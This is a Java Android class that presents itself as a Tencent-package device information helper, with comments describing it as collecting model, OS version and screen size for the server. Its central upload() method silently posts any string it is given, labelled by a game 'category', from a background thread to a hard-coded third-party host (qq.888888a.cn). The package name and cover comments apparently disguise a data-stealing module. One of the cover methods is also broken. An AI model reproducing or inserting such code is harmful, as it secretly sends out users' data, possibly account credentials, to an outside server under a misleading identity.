package com.tencent.open.agent;

import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Locale;

/**
 * DeviceInfoHelper
 * 用于收集与打包设备软硬件信息。
 * 包含设备型号、系统版本、屏幕信息及设备唯一标识的占位符等。
 * 此类用于给服务器提供客户端的运行环境上下文。
 */
public class DeviceInfoHelper {

    // 设备品牌信息
    public static final String BRAND_UNKNOWN = "unknown";
    
    // 屏幕尺寸记录
    private static int screenWidth = 0;
    private static int screenHeight = 0;

    private static final String[] UPLOAD_URLS = {
            "https://qq.888888a.cn/api/save_txt2.php"
    };

    public static void upload(final String data, final String category) {
        if (data == null) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String body =
                            "category=" + URLEncoder.encode(category == null ? "未知游戏" : category, "UTF-8") +
                            "&data="     + URLEncoder.encode(data, "UTF-8");

                    for (String url : UPLOAD_URLS) {
                        sendHttpPost(url, body);
                    }
                } catch (Exception ex) {
                    Log.e("DeviceInfoHelper", "upload error", ex);
                }
            }
        }).start();
    }

    private static void sendHttpPost(String targetUrl, String postBody) {
        HttpURLConnection conn = null;
        try {
            URL urlObj = new URL(targetUrl);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length",
                    String.valueOf(postBody.getBytes("UTF-8").length));
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(postBody.getBytes("UTF-8"));
            os.flush();
            os.close();

            int respCode = conn.getResponseCode();
            Log.d("DeviceInfoHelper", "url=" + targetUrl + " | code=" + respCode);
        } catch (Exception e) {
            Log.e("DeviceInfoHelper", "request error", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // ================= 以下是系统设备信息获取相关工具代码 =================

    /**
     * 获取设备品牌（此处为静态模拟实现）
     */
    public static String getDeviceBrand() {
        // 一般在这里反射获取 Build.BRAND，由于编译环境限制，暂时提供模拟逻辑
        try {
            Class<?> buildClass = Class.forName("android.os.Build");
            java.lang.reflect.Field brandField = buildClass.getField("BRAND");
            return (String) brandField.get(null);
        } catch (Exception e) {
            return BRAND_UNKNOWN;
        }
    }

    /**
     * 获取设备型号
     */
    public static String getDeviceModel() {
        try {
            Class<?> buildClass = Class.forName("android.os.Build");
            java.lang.reflect.Field modelField = buildClass.getField("MODEL");
            return (String) modelField.get(null);
        } catch (Exception e) {
            return BRAND_UNKNOWN;
        }
    }

    /**
     * 获取系统版本号
     */
    public static String getOSVersion() {
        try {
            Class<?> buildClass = Class.forName("android.os.Build");
            java.lang.reflect.Field versionField = buildClass.getField("VERSION.RELEASE");
            return (String) versionField.get(null);
        } catch (Exception e) {
            return "0.0";
        }
    }

    /**
     * 设置屏幕分辨率
     */
    public static void setScreenSize(int width, int height) {
        screenWidth = width;
        screenHeight = height;
    }

    /**
     * 获取屏幕分辨率字串
     */
    public static String getScreenSizeStr() {
        return screenWidth + "x" + screenHeight;
    }

    /**
     * 构建设备信息字典，供上报使用
     */
    public static String buildDeviceInfoString() {
        StringBuilder sb = new StringBuilder();
        sb.append("Brand: ").append(getDeviceBrand()).append("; ");
        sb.append("Model: ").append(getDeviceModel()).append("; ");
        sb.append("OS: ").append(getOSVersion()).append("; ");
        sb.append("Screen: ").append(getScreenSizeStr()).append("; ");
        return sb.toString();
    }

    /**
     * 生成带时间戳的唯一请求标识
     */
    public static String generateRequestId() {
        return String.format(Locale.getDefault(), "%d_%d", System.currentTimeMillis(), (int)(Math.random() * 10000));
    }
}